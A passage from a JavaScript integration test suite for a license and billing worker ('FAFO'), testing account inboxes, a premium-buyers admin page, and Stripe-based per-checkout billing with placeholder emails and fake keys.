    assert.equal(dbRows("SELECT COUNT(*) AS n FROM account_inbox_of WHERE email_norm = 'ibx.r1@example.com'")[0].n, 0, "its inbox row went with it");
    assert.equal(ibDone((await ibAdd(A, ["ibx.r1@example.com:Pw-r1"])).location), "Added 1 to your list, in buyers-inbox@example.com.");
    assert.equal(inboxNameOf("ibx.r1@example.com"), "buyers-inbox@example.com");
  });
  await test("a new Only mine inbox taking the accounts with no inbox says which ones buyers keep", async () => {
    const A = ibIds["buyers-inbox@example.com"];
    const given = dbRows("SELECT email_norm FROM accounts WHERE store = '*' AND key_hash = 'held-2' AND email_norm LIKE 'ibx.%' ORDER BY email_norm LIMIT 1")[0].email_norm;
    await ibPost({ action: "move-inbox", email: given, to_inbox: "none" });
    await ibPost({ action: "move-inbox", email: "ibx.r1@example.com", to_inbox: "none" });
    const r = await ibPost({ action: "inbox-new", name: "mine-d@example.com", kind: "mine", adopt: "1" });
    assert.equal(ibDone(r.location), "Made mine-d@example.com, an Only mine inbox: only your own FAFO's slots get its accounts. Put the 2 accounts that had no inbox in it. One is with a buyer, who keeps it until it's given back.");
    const p = await ibAfter(r.location);
    const c = dbRows(`SELECT COUNT(*) AS n, SUM(key_hash IS NULL) AS free, SUM(key_hash IS NULL AND NOT (store = '*' AND EXISTS (SELECT 1 FROM account_inbox_of i
      JOIN account_inboxes b ON b.id = i.inbox_id WHERE i.email_norm = accounts.email_norm AND b.mine = 1))) AS buyers FROM accounts WHERE COALESCE(offer_id, '') NOT LIKE 'reuse:%'`)[0];
    assert.ok(c.buyers < c.free, "some free ones are Only mine");
    assert.ok(p.includes(`<p class="who">${c.n} accounts, ${c.free} free (${c.buyers} for buyers)</p>`), "the free ones buyers can get: " + JSON.stringify(c));
    const D = dbRows("SELECT id FROM account_inboxes WHERE name = 'mine-d@example.com'")[0].id;
    for (const e of [given, "ibx.r1@example.com"]) await ibPost({ action: "move-inbox", email: e, to_inbox: A });
    assert.equal(ibDone((await ibPost({ action: "inbox-delete", inbox: D })).location), "Deleted mine-d@example.com.");
    sqlRun("UPDATE accounts SET key_hash = NULL WHERE key_hash = 'held-2'");
  });
  await test("an account and its inbox go on the list together or not at all (Add, and an email edit)", async () => {
    const C = ibIds["mine-b@example.com"];
    // The inbox write fails (a trigger in the local database): the account mustn't be left on the list without it, For buyers.
    sqlRun("CREATE TRIGGER ibx_test_fail BEFORE INSERT ON account_inbox_of WHEN NEW.email_norm = 'ibx.t1@example.com' BEGIN SELECT RAISE(ABORT, 'test'); END");
    try {
      const r = await sendRaw(ibLink, { action: "add", inbox: C, accounts: "ibx.t1@example.com:Pw-t1" });
      assert.notEqual(r.status, 303, "not added");
      assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm = 'ibx.t1@example.com'")[0].n, 0, "nor on the list without its inbox");
    } finally { sqlRun("DROP TRIGGER IF EXISTS ibx_test_fail"); }
    assert.equal(ibDone((await ibAdd(C, ["ibx.t1@example.com:Pw-t1"])).location), "Added 1 to your list, in mine-c@example.com.");
    sqlRun("CREATE TRIGGER ibx_test_fail2 BEFORE UPDATE ON account_inbox_of WHEN NEW.email_norm = 'ibx.t2@example.com' BEGIN SELECT RAISE(ABORT, 'test'); END");
    try {
      const page = unescape(await (await send(ibLink, { action: "save", store: "*", email: "ibx.t1@example.com", new_email: "ibx.t2@example.com", password: "" })).text());
      assert.ok(page.includes("It changed meanwhile"), page.slice(0, 2000));
      assert.deepEqual(dbRows("SELECT email_norm FROM accounts WHERE email_norm IN ('ibx.t1@example.com', 'ibx.t2@example.com')"), [{ email_norm: "ibx.t1@example.com" }], "the email stayed");
      assert.equal(inboxNameOf("ibx.t1@example.com"), "mine-c@example.com", "and so did its inbox");
    } finally { sqlRun("DROP TRIGGER IF EXISTS ibx_test_fail2"); }
  });
  await test("Reassign tells a buyer's why: the only free ones are Only mine (the old ones put back too)", async () => {
    const [A, C] = [ibIds["buyers-inbox@example.com"], ibIds["mine-b@example.com"]];
    sqlRun("UPDATE accounts SET key_hash = 'held-3' WHERE store = '*' AND key_hash IS NULL");
    const x = masterFor("Owen A")[0], y = masterFor("Owen B")[0];
    for (const e of [x.email_norm, y.email_norm]) await ibPost({ action: "move-inbox", email: e, to_inbox: C });
    await ibAdd(A, ["ibx.f1@example.com:Pw-f1"]);
    const r = await postPairs(ibLink, [["action", "do-reassign"], ["email", x.email_norm], ["email", y.email_norm], ["how", "list"], ["old", "free"]], "manual");
    assert.equal(r.status, 303); const loc = r.headers.get("location"); await r.text();
    assert.equal(masterFor("Owen A")[0].email, "ibx.f1@example.com", "the one For buyers account");
    assert.ok(ibErr(loc).includes(`${y.email} got no new account: the only free ones left are in your Only mine inboxes, which buyers never get.`), ibErr(loc));
    assert.equal(masterFor("Owen B")[0].email, y.email, "unchanged");
    const back = dbRows(`SELECT key_hash FROM accounts WHERE store = '*' AND email_norm = '${x.email_norm}'`)[0];
    assert.equal(back.key_hash, null, "the old one is back, free, in its Only mine inbox");
    assert.equal(inboxNameOf(x.email_norm), "mine-c@example.com");
    sqlRun("UPDATE accounts SET key_hash = NULL WHERE key_hash = 'held-3'");
  });
  await test("an inbox page with no free accounts says what switching does", async () => {
    sqlRun("UPDATE accounts SET key_hash = 'held-4' WHERE store = '*' AND key_hash IS NULL AND email_norm IN (SELECT email_norm FROM account_inbox_of WHERE inbox_id = '" + ibIds["mine-b@example.com"] + "')");
    const p = await ibPage({ action: "inbox", inbox: ibIds["mine-b@example.com"] });
    assert.ok(p.includes("It has no free accounts now: making it For buyers lets buyers' slots get the ones that come free later."), p.slice(0, 2500));
    sqlRun("UPDATE accounts SET key_hash = NULL WHERE key_hash = 'held-4'");
  });
  await test("cleanup: the inboxes and the accounts these tests added go; the list is as it was", async () => {
    for (const q of ["DELETE FROM accounts WHERE email_norm LIKE 'ibx.%'", "UPDATE accounts SET key_hash = NULL WHERE key_hash IN ('held-for-inbox-test', 'held-2')",
      "DELETE FROM account_inbox_of", "DELETE FROM account_inboxes", "DELETE FROM account_stock WHERE store = '*'", `DELETE FROM slot_limits WHERE key_hash = '${bobHash}'`]) sqlRun(q);
    for (const x of ibStock0) sqlRun(`INSERT INTO account_stock (store, low_at, empty_at) VALUES ('*', ${x.low_at ?? "NULL"}, ${x.empty_at ?? "NULL"})`);
    for (const x of ibLimit0) sqlRun(`INSERT INTO slot_limits (key_hash, slot_limit, updated_at) VALUES ('${x.key_hash}', ${x.slot_limit}, ${x.updated_at})`);
    const p = await ibPage();
    assert.ok(p.includes("Until you make one, every account is for buyers.") && !p.includes('name="to_inbox"'));
  });

  console.log("\nPremium buyers (app 1.9.127)");
  // Bob's FAFO sends order alerts now (above), so it's the owner's here.
  const { createHash } = await import("node:crypto");
  const hashOf = (k) => createHash("sha256").update("pvlt:" + k.toUpperCase().replace(/[^A-Z0-9]/g, "")).digest("hex");
  const premiumAsk = async (key) => { const r = await getAuth("/premium", key); assert.equal(r.status, 200); assert.equal(r.headers.get("cache-control"), "no-store"); return r.json(); };
  const premiumOf = async (key) => (await premiumAsk(key)).premium;
  const premiumLinkIn = (content) => (content.match(/\((http[^)]+\/premium\/list\/[^)]+)\)/) || [])[1];
  const premiumPost = async (link, body) => { const r = await fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), ...body }) }); return { status: r.status, text: unescape(await r.text()) }; };
  let premiumLink;
  await test("premium: a license is needed; no buyer is premium to start, but the FAFO that sends order alerts is", async () => {
    assert.equal((await fetch(BASE + "/premium")).status, 401);
    assert.equal((await getAuth("/premium", "PVLT-NOPE-NOPE-NOPE-NOPE")).status, 401);
    assert.equal(await premiumOf(ginaKey), false);
    assert.equal(await premiumOf(frankKey), false, "it stopped sending alerts above");
    assert.deepEqual(await premiumAsk(bobKey), { premium: true, owner: true }, "the license that sends order alerts: the owner's");
    assert.deepEqual(await premiumAsk(ginaKey), { premium: false, owner: false });
    assert.equal((await fetch(BASE + "/premium", { method: "OPTIONS" })).status, 204);
  });
  await test("asking for the Premium buyers page posts its link to the channel; the page lists every buyer", async () => {
    assert.equal((await slots("/premium/list", null, {})).status, 401);
    const before = webhookPosts.length;
    const r = await slots("/premium/list", bobKey, { name: "Owner" });
    assert.equal(r.status, 200); assert.deepEqual(await r.json(), { status: "sent" });
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1).content;
    assert.match(m, /^⭐ \*\*Premium buyers\*\*\nAsked by \*\*Owner\*\* · @bob · license …\w{4}\n\[Choose who's premium\]\(http[^)]+\/premium\/list\/[A-Za-z0-9_-]+\?t=[A-Za-z0-9_-]+\) · the link works for 24 hours$/, m);
    premiumLink = premiumLinkIn(m); assert.ok(premiumLink);
    const p = await fetch(premiumLink), text = unescape(await p.text());
    assert.equal(p.status, 200); assert.equal(p.headers.get("cache-control"), "no-store");
    const lics = dbRows("SELECT username FROM licenses WHERE revoked_at IS NULL");
    assert.ok(lics.length > 3);
    for (const l of lics) assert.ok(text.includes(`<td class="em">@${l.username}`), "every buyer: " + l.username);
    assert.ok(text.includes("Premium · your FAFO (it sends order alerts)"), "the owner's own FAFO");
    assert.ok(text.includes(`0 of ${lics.length - 1} buyers are premium`), "the count: buyers only, not the owner's own FAFO");
    assert.ok(/<tr data-q="@bob[^"]* premium · your fafo \(it sends order alerts\)">/.test(text) && /<tr data-q="@gina[^"]* standard">/.test(text), "searched by what it shows: premium or standard, so \"premium\" doesn't find the rest");
    assert.ok(/<td>Standard<\/td>/.test(text) && !text.includes("Not premium"), "a buyer who isn't premium reads Standard");
    assert.ok(text.includes('sessionStorage.setItem(KEY, f.value)'), "the search is kept for the tab");
    assert.ok(!text.includes(ginaKey) && !text.includes(bobKey), "never a whole license key");
    assert.ok(text.includes('<input type="search" id="find"'), "a search box");
    assert.equal((await fetch(premiumLink.replace(/t=[^&]+/, "t=wrong"))).status, 404, "a wrong token");
    assert.equal((await fetch(premiumLink.replace(/\/premium\/list\/[^?]+/, "/premium/list/nope1234"))).status, 404, "a wrong id");
    assert.equal((await fetch(premiumLink, { method: "PUT" })).status, 405);
  });
  await test("Make premium and Remove premium change what that buyer's FAFO is told", async () => {
    const g = hashOf(ginaKey);
    const made = await premiumPost(premiumLink, { action: "grant", key: g });
    assert.equal(made.status, 200); assert.ok(made.text.includes("@gina is premium now."), made.text.slice(0, 400));
    assert.deepEqual(await premiumAsk(ginaKey), { premium: true, owner: false }, "premium, not the owner");
    assert.equal(await premiumOf(frankKey), false, "only that buyer");
    assert.ok(/1 of \d+ buyers is premium/.test(made.text), "the count follows");
    assert.equal((await premiumPost(premiumLink, { action: "grant", key: g })).status, 200, "again changes nothing");
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM premium WHERE key_hash = '${g}'`)[0].n, 1);
    const gone = await premiumPost(premiumLink, { action: "remove", key: g });
    assert.ok(gone.text.includes(`License …${ginaKey.slice(-4)} isn't premium any more.`));
    assert.equal(await premiumOf(ginaKey), false);
    const bad = await premiumPost(premiumLink, { action: "grant", key: "0".repeat(64) });
    assert.ok(bad.text.includes("That license isn't on the list any more."), "only a license on the list");
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM premium")[0].n, 0);
    assert.equal((await premiumPost(premiumLink.replace(/t=[^&]+/, "t=wrong"), { action: "grant", key: g })).status, 404, "no change with a wrong token");
    assert.equal(await premiumOf(ginaKey), false);
  });
  await test("a key made by hand is made premium by its key; anything else isn't", async () => {
    const r = await premiumPost(premiumLink, { action: "add", license: GH_KEY.toLowerCase() });
    assert.ok(r.text.includes(`License …${GH_KEY.slice(-4)} is premium now.`), r.text.slice(0, 400));
    assert.equal(await premiumOf(GH_KEY), true);
    assert.ok(r.text.includes("Key made by hand") && r.text.includes(`License …${GH_KEY.slice(-4)}, made by hand`), "listed");
    assert.ok(/1 of \d+ buyers is premium/.test(r.text), "and counted");
    assert.ok((await premiumPost(premiumLink, { action: "add", license: "PVLT-NOPE-NOPE-NOPE-NOPE" })).text.includes("FAFO doesn't know that license key, or it was turned off."));
    assert.ok((await premiumPost(premiumLink, { action: "add", license: "hello" })).text.includes("That isn't a license key."));
    const off = await premiumPost(premiumLink, { action: "remove", key: hashOf(GH_KEY) });
    assert.ok(off.text.includes(`License …${GH_KEY.slice(-4)} isn't premium any more.`));
    assert.equal(await premiumOf(GH_KEY), false);
  });
  await test("a premium license that's turned off shows as turned off, isn't counted, and its FAFO isn't premium", async () => {
    const offKey = dbRows("SELECT license_key FROM licenses WHERE username = 'quinn' AND revoked_at IS NULL")[0].license_key, offHash = hashOf(offKey);
    assert.ok((await premiumPost(premiumLink, { action: "grant", key: offHash })).text.includes("@quinn is premium now."));
    assert.equal(await premiumOf(offKey), true);
    await admin("/admin/revoke", { key: offKey });
    assert.equal((await getAuth("/premium", offKey)).status, 401, "a turned-off license isn't told premium");
    const t = unescape(await (await fetch(premiumLink)).text());
    assert.ok(/<td class="em">@quinn[^<]*<br><span[^>]*>License …\w{4}, issued [\d-]+<\/span><\/td><td style="color:#ff8a80">License turned off<\/td>/.test(t), "named, and turned off: not a key made by hand");
    assert.ok(/<tr data-q="@quinn[^"]* license turned off">/.test(t), "searched by what it shows");
    assert.ok(/0 of \d+ buyers are premium/.test(t), "not counted");
    assert.ok(!(await premiumPost(premiumLink, { action: "grant", key: offHash })).text.includes("is premium now"), "can't be made premium while off");
    const gone = await premiumPost(premiumLink, { action: "remove", key: offHash });
    assert.ok(gone.text.includes(`License …${offKey.slice(-4)} isn't premium any more.`) && !/@quinn[^<]*<br>/.test(gone.text), "Remove premium takes it off the page");
    await admin("/admin/restore", { key: offKey });
    assert.equal(await premiumOf(offKey), false, "turned back on, it's not premium once removed");
  });
  await test("the owner's admin view lists the premium licenses; the link lasts 24 hours and 10 are asked a day", async () => {
    await premiumPost(premiumLink, { action: "grant", key: hashOf(ginaKey) });
    const d = await (await admin("/admin/premium")).json();
    assert.deepEqual(d.premium.map((x) => [x.key_last4, x.username]), [[ginaKey.slice(-4), "gina"]]);
    assert.deepEqual(d.alertSender, { key_last4: bobKey.slice(-4), username: "bob" });
    assert.equal((await fetch(BASE + "/admin/premium")).status, 401);
    const id = premiumLink.match(/\/premium\/list\/([^?]+)/)[1];
    sqlRun(`UPDATE premium_lists SET created_at = created_at - ${25 * 3600 * 1000} WHERE id = '${id}'`);
    const late = await fetch(premiumLink); assert.equal(late.status, 410);
    assert.match(await late.text(), /This link has expired\. Ask again from FAFO: Settings → Premium buyers\./);
    assert.equal((await premiumPost(premiumLink, { action: "remove", key: hashOf(ginaKey) })).status, 410, "and changes nothing");
    assert.equal(await premiumOf(ginaKey), true);
    let n = dbRows(`SELECT COUNT(*) AS n FROM premium_lists WHERE key_hash = '${hashOf(bobKey)}' AND created_at > ${Date.now() - 86400000}`)[0].n;
    while (n < 10) { assert.equal((await slots("/premium/list", bobKey, { name: "Owner" })).status, 200); n++; }
    const before = webhookPosts.length;
    assert.equal((await slots("/premium/list", bobKey, { name: "Owner" })).status, 429, "the 11th today");
    assert.equal(webhookPosts.length, before, "nothing posted");
  });

  console.log("\nPayments: off until the Stripe keys are set (2026-10-18)");
  // Bob's FAFO sends order alerts (above), so it's the owner's here.
  const acctOf = (e) => createHash("sha256").update("acct:" + String(e).trim().toLowerCase()).digest("hex");
  const billOf = async (key) => { const r = await fetchOnce(BASE + "/billing", { headers: { authorization: "Bearer " + key }, cache: "no-store" }); assert.equal(r.status, 200); assert.equal(r.headers.get("cache-control"), "no-store"); return r.json(); };
  const ownFile = (rows, assigned = 0) => ({ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(rows.map(([n, e]) => slotRow(n, e || ""))), assigned });
  const loginsFile = (emails) => ({ store: "Target", storeKey: "target", kind: "logins", text: emails.map((e) => `${e}:Sample-Pw-1`).join("\r\n") });
  const submit = async (key, files, extra = {}) => fetchOnce(BASE + "/submissions", { method: "POST", headers: { authorization: "Bearer " + key, "content-type": "application/json" },
    body: JSON.stringify({ files, name: extra.name || "Sample buyer", slots: files.filter((f) => f.kind === "profiles").reduce((n, f) => n + f.text.split("\r\n").length - 1, 0), batch: extra.batch || "bl" + rid(), ...extra }) });
  // A buyer's license from Continue with Discord (approval off), once the channel has heard of it.
  // Requests go through fetchOnce: the database reads between them leave wrangler's idle connections closed.
  const api = (path, key, body) => fetchOnce(BASE + path, { method: body ? "POST" : "GET", headers: { ...(key ? { authorization: "Bearer " + key } : {}), "content-type": "application/json" }, body: body && JSON.stringify(body) });
  const adminGet = (path) => fetchOnce(BASE + path, { headers: { authorization: "Bearer test-admin-token" } });
  // Earlier tests used up the hour's sign-ins from this address (20): theirs are moved an hour back first.
  const newBuyer = async (who) => {
    sqlRun(`UPDATE requests SET created_at = created_at - 3600000 WHERE created_at > ${Date.now() - 3600000}`);
    const r = rid(), start = await fetchOnce(BASE + "/discord/start?r=" + r, { redirect: "manual" }), state = new URL(start.headers.get("location")).searchParams.get("state");
    await start.text();
    await (await fetchOnce(`${BASE}/discord/callback?state=${encodeURIComponent(state)}&code=${who}`, { redirect: "manual" })).text();
    const st = await (await fetchOnce(BASE + "/discord/status/" + r)).json();
    assert.equal(st.status, "issued");
    await new Promise((ok) => setTimeout(ok, 400));
    return st.key;
  };
  let vicKey;
  const windowsOf = (batch) => dbRows(`SELECT store, store_name, profile, acct_hash, pulled_at FROM billing_accounts WHERE batch = '${batch}' ORDER BY id`);
  await test("payments off: GET /billing says so; reports, Stripe and the webhook do nothing", async () => {
    assert.deepEqual(await billOf(ginaKey), { on: false });
    assert.equal((await api("/billing", null)).status, 401);
    assert.equal((await api("/billing", "PVLT-NOPE-NOPE-NOPE-NOPE")).status, 401);
    const r = await api("/billing/checkouts", ginaKey, { orders: [{ account: "sample.buyer@example.com", store: "target", orderNo: "OFF-1", at: today, stage: "placed" }] });
    assert.deepEqual(await r.json(), { ok: true, added: 0, canceled: 0, ignored: 1 });
    assert.equal((await api("/billing/checkout", ginaKey, { kind: "pay" })).status, 409);
    assert.equal((await api("/billing/list", bobKey, { name: "Owner" })).status, 503);
    assert.equal((await fetch(BASE + "/stripe/webhook", { method: "POST", body: "{}" })).status, 503);
    assert.deepEqual(dbRows("SELECT COUNT(*) AS n FROM billing_lines UNION ALL SELECT COUNT(*) FROM billing_config").map((x) => x.n), [0, 0], "nothing billed, nor when it started");
    // Payments that were on before (the keys taken away since): that they're off is noted, so orders from meanwhile aren't billed later.
    sqlRun(`INSERT INTO billing_config (k, v, updated_at) VALUES ('on_since:live', '1', 1)`);
    try {
      assert.deepEqual(await billOf(ginaKey), { on: false });
      assert.ok(Math.abs(Number(dbRows("SELECT v FROM billing_config WHERE k = 'off_seen'")[0].v) - Date.now()) < 300000, "off noted");
    } finally { sqlRun("DELETE FROM billing_config"); }
  });
  await test("payments off: a batch's own accounts are kept as hashes once it reaches the channel, never before", async () => {
    vicKey = await newBuyer("vic");
    const files = [ownFile([["Vic Own", "Vic.Own@example.com"], ["Vic Given", ""]], 1), loginsFile(["Vic.Own@example.com"])];
    const failed = "vof" + rid();
    webhookFail.push(500);
    assert.equal((await submit(vicKey, files, { batch: failed, name: "Vic" })).status, 502);
    assert.deepEqual(windowsOf(failed), [], "nothing for a batch that didn't post");
    const ok = "vok" + rid();
    assert.equal((await submit(vicKey, files, { batch: ok, name: "Vic" })).status, 200);
    assert.deepEqual(windowsOf(ok), [{ store: "target", store_name: "Target", profile: "Vic Own", acct_hash: acctOf("vic.own@example.com"), pulled_at: null }], "the login's row; the assigned one had no email");
    assert.ok(!JSON.stringify(dbRows("SELECT * FROM billing_accounts")).includes("@"), "never an email");
  });

  console.log("\nPayments (Stripe)");
  const STRIPE = [`STRIPE_API_BASE=http://127.0.0.1:${DISCORD_PORT}/stripe`, "STRIPE_WEBHOOK_SECRET=fake_webhook_secret_not_real"];
  await test("schema.sql brings the last release's database to the same tables and indexes as a new one (db:init can't add columns)", async () => {
    // The last release's: the committed one if this one isn't committed yet, else the one before the last commit that changed
    // it (on main, the merge before; its parent needs history: a checkout with fetch-depth 2 or more).
    const git = (...a) => execFileSync("git", a, { cwd: root, stdio: ["ignore", "pipe", "ignore"] }).toString();
    let old;
    try {
      old = git("show", "HEAD:license-worker/schema.sql");
      if (old === readFileSync(join(root, "schema.sql"), "utf8")) old = git("show", `${git("log", "--first-parent", "-n", "1", "--format=%H", "--", "schema.sql").trim()}^:license-worker/schema.sql`);
    } catch { console.log("    (no git history here: skipped)"); return; }
    writeFileSync(join(tmp, "schema-old.sql"), old);
    const d1 = (dir, args) => execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", join(tmp, dir), ...args], { cwd: root, env, stdio: "pipe" });
    d1("upgraded", ["--file", join(tmp, "schema-old.sql")]); d1("upgraded", ["--file", "schema.sql"]); d1("upgraded", ["--file", "schema.sql"]);
    d1("fresh", ["--file", "schema.sql"]);
    const q = (dir, sql) => JSON.parse(d1(dir, ["--command", sql, "--json"]).toString())[0].results;
    const cols = (dir) => q(dir, `SELECT m.name AS t, p.cid, p.name, p.type, p."notnull" AS nn, p.dflt_value, p.pk FROM sqlite_master m JOIN pragma_table_info(m.name) p
      WHERE m.type = 'table' AND m.name NOT LIKE 'sqlite_%' AND m.name NOT LIKE '_cf_%' ORDER BY m.name, p.cid`);
    const idx = (dir) => q(dir, "SELECT name, tbl_name, sql FROM sqlite_master WHERE type = 'index' AND sql IS NOT NULL ORDER BY name");
    const fresh = cols("fresh");
    assert.ok(fresh.some((c) => c.t === "billing_lines" && c.name === "dispute_answer") && fresh.some((c) => c.t === "billing_accounts"), "the billing tables are there");
    assert.deepEqual(cols("upgraded"), fresh, "every table's columns");
    assert.deepEqual(idx("upgraded"), idx("fresh"), "every index");
  });
  stopWorker(workers.pop());
  await new Promise((r) => setTimeout(r, 1500));
  await startWorker("billing", APPROVAL_PORT + 4, ["REQUIRE_APPROVAL=", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0", ...STRIPE, "STRIPE_SECRET_KEY=fake_live_key_not_real"], "approval");
  const hookAt = (raw, opts = {}) => {
    const t = opts.t ?? Math.floor(Date.now() / 1000);
    const v1 = createHmac("sha256", opts.secret ?? "fake_webhook_secret_not_real").update(`${t}.${raw}`).digest("hex");
    return fetchOnce(BASE + "/stripe/webhook", { method: "POST", headers: { "content-type": "application/json", ...(opts.header === null ? {} : { "stripe-signature": opts.header ?? `t=${t},v1=deadbeef,v1=${v1}` }) }, body: raw });
  };
  const event = (type, object, extra = {}) => JSON.stringify({ id: "evt_" + rid().slice(0, 16), object: "event", api_version: "2026-09-30.endive", type, livemode: true, created: Math.floor(Date.now() / 1000), data: { object }, ...extra });
  const hook = async (type, object, extra) => { const r = await hookAt(event(type, object, extra)); await r.text(); return r.status; };
  const checkout = async (key, body) => { const r = await api("/billing/checkout", key, body); return { status: r.status, body: await r.json() }; };
  const lineOf = async (key, orderNo) => (await billOf(key)).lines.find((l) => l.orderNo === orderNo);
  const lastStripe = (method, path) => stripeCalls.filter((c) => c.method === method && (path instanceof RegExp ? path.test(c.path) : c.path === path)).at(-1);
  const posts = (from) => webhookPosts.slice(from).map((m) => m.content);
  let tessKey, umaKey, tessAcct, tessHash, umaHash, tessCus;
  const billEv = (o) => ({ account: tessAcct, store: "target", storeName: "Target", orderNo: "TB-1", item: "Sample Booster Bundle", qty: "2", total: "$59.98", stage: "placed", at: today, ...o });
  const alerts = async (events) => { const r = await api("/alerts", bobKey, { events }); assert.equal(r.status, 200); return r.json(); };
  await test("payments on: the first request notes when; buyers approved before are Friends and Family, keys made by hand too, and the FAFO that sends order alerts is the owner's", async () => {
    const g = await billOf(ginaKey);
    assert.deepEqual({ ...g, now: 0 }, { on: true, mode: "live", exempt: "family", plan: null, nextPlan: null, block: null, now: 0,
      prices: { checkout: 1000, monthly: 2500, extra: 2500, monthlySlots: 10, extraSlots: 15, extraMax: 1, dueDays: 3 }, sub: null, lines: [], owed: 0, overdue: 0, paid30: 0, payments: [], report: null });
    assert.equal((await billOf(bobKey)).exempt, "owner");
    assert.equal((await billOf(GH_KEY)).exempt, "family", "a key made by hand");
    const since = Number(dbRows("SELECT v FROM billing_config WHERE k = 'on_since:live'")[0].v);
    assert.ok(Math.abs(since - Date.now()) < 300000, "noted when payments came on");
    assert.equal((await (await adminGet("/admin/billing")).json()).onSince.live, since);
    // Two days back, with the licenses issued before it, so the orders below (dated today) are from after payments began.
    sqlRun(`UPDATE billing_config SET v = '${since - 2 * 86400000}' WHERE k = 'on_since:live'`);
    sqlRun(`UPDATE licenses SET issued_at = issued_at - ${2 * 86400000} WHERE issued_at <= ${since}`);
    assert.equal((await billOf(ginaKey)).exempt, "family", "still Friends and Family");
  });
  await test("Friends and Family are never refused, and orders on accounts given to them are never billed", async () => {
    sqlRun(`INSERT OR IGNORE INTO accounts (store, email, email_norm, password, added_at, offer_id) VALUES ${Array.from({ length: 8 }, (_, i) => `('*', 'bill.pool${i + 1}@example.com', 'bill.pool${i + 1}@example.com', 'Sample-Pw-${i + 1}', ${Date.now()}, 'test')`).join(", ")}`);
    const r = await submit(vicKey, [ownFile([["Vic Fam", ""]], 1)], { name: "Vic", on: 30 });
    assert.equal(r.status, 200, await r.clone().text());
    const acct = dbRows(`SELECT email FROM accounts WHERE key_hash = '${hashOf(vicKey)}' AND store = 'target' AND profile = 'Vic Fam'`)[0].email;
    const a = await alerts([billEv({ account: acct, orderNo: "VF-1" })]);
    assert.equal(a.sent, 1, "the alert still reaches them");
    assert.equal((await billOf(vicKey)).exempt, "family");
    assert.deepEqual((await billOf(vicKey)).lines, []);
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM billing_lines")[0].n, 0);
    const lim = await (await api("/slots/limit", vicKey)).json();
    assert.deepEqual([lim.limit, lim.canRequest, lim.plan], [20, true, undefined], "their limit is as approved");
  });
  await test("a buyer approved after payments began is refused until they pick a plan (402); the channel hears once", async () => {
    tessKey = await newBuyer("tess"); tessHash = hashOf(tessKey);
    const st = await billOf(tessKey);
    assert.deepEqual([st.exempt, st.plan, st.block], [null, null, { reason: "no-plan", text: "Pick a plan to submit." }]);
    const before = webhookPosts.length, files = [ownFile([["Tess Own", "tess.own@example.com"]]), loginsFile(["tess.own@example.com"])];
    const r = await submit(tessKey, files, { name: "Tess" });
    assert.equal(r.status, 402); assert.equal(r.headers.get("cache-control"), "no-store");
    assert.deepEqual(await r.json(), { error: "Pick a plan to submit.", billing: { reason: "no-plan", due: 0, overdue: 0, n: 0 } });
    assert.deepEqual(posts(before), ["⛔ **Tess** tried to send 1 slot: they haven't picked a plan · on an older FAFO that can't show why: ask them to restart FAFO or reload app.fafoaco.com"]);
    const again = await submit(tessKey, files, { name: "Tess", on: 3 });
    assert.equal(again.status, 402);
    assert.equal(webhookPosts.length, before + 1, "once every 6 hours");
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM submissions WHERE key_hash = '${tessHash}'`)[0].n, 0, "nothing recorded, nothing posted");
    assert.equal(dbRows(`SELECT last_on FROM billing_people WHERE key_hash = '${tessHash}'`)[0].last_on, 3, "how many they have on");
  });
  let tessBatch;
  await test("picking pay per checkout lets them submit; an assigned account and their own login go out", async () => {
    const p = await (await api("/billing/plan", tessKey, { plan: "checkout" })).json();
    assert.deepEqual([p.plan, p.block], ["checkout", null]);
    assert.equal((await api("/billing/plan", tessKey, { plan: "monthly" })).status, 400, "the monthly plan goes through Stripe");
    tessBatch = "tb" + rid();
    const r = await submit(tessKey, [ownFile([["Tess Own", "tess.own@example.com"], ["Tess Both", "both.own@example.com"], ["Tess Given", ""]], 1), loginsFile(["tess.own@example.com", "both.own@example.com"])],
      { name: "Tess", on: 3, batch: tessBatch, stores: [{ name: "Target", n: 3, seller: 1 }] });
    assert.equal(r.status, 200, await r.clone().text());
    tessAcct = dbRows(`SELECT email FROM accounts WHERE key_hash = '${tessHash}' AND store = 'target' AND profile = 'Tess Given'`)[0].email;
    assert.deepEqual(windowsOf(tessBatch).map((x) => [x.profile, x.acct_hash]), [["Tess Own", acctOf("tess.own@example.com")], ["Tess Both", acctOf("both.own@example.com")]]);
  });
  await test("an order on an account given to them goes on their invoice: $10, due 3 days after it", async () => {
    assert.equal((await alerts([billEv({ orderNo: "tb-1001" })])).sent, 1);
    const st = await billOf(tessKey), l = st.lines[0];
    assert.equal(st.lines.length, 1);
    const { id, createdAt, dueAt, ...rest } = l;
    assert.deepEqual(rest, { store: "target", storeName: "Target", orderNo: "TB-1001", item: "Sample Booster Bundle", qty: "2", orderAt: today, source: "alert", amount: 1000,
      state: "due", paidAt: null, acctHash: acctOf(tessAcct), profile: "Tess Given", disputable: false });
    assert.equal(dueAt, Math.max(Date.parse(today) + 86400000, createdAt) + 3 * 86400000);
    assert.deepEqual([st.owed, st.overdue, st.block], [1000, 0, null]);
    await alerts([billEv({ orderNo: "TB-1001", stage: "shipped" }), billEv({ orderNo: "TB-1001" })]);
    assert.equal((await billOf(tessKey)).lines.length, 1, "one line per order");
  });
  await test("the store canceling an order before it's paid makes it free; the buyer's own report can't cancel an alert's line", async () => {
    const r = await (await api("/billing/checkouts", tessKey, { orders: [{ account: tessAcct, store: "target", orderNo: "TB-1001", at: today, stage: "canceled" }] })).json();
    assert.deepEqual(r, { ok: true, added: 0, canceled: 0, ignored: 1 });
    assert.equal((await lineOf(tessKey, "TB-1001")).state, "due");
    await alerts([billEv({ orderNo: "TB-1002" })]);
    await alerts([billEv({ orderNo: "TB-1002", stage: "canceled" })]);
    const st = await billOf(tessKey);
    assert.equal(st.lines.find((l) => l.orderNo === "TB-1002").state, "canceled");
    assert.equal(st.owed, 1000);
  });
  await test("an overdue checkout turns Submit off (402)", async () => {
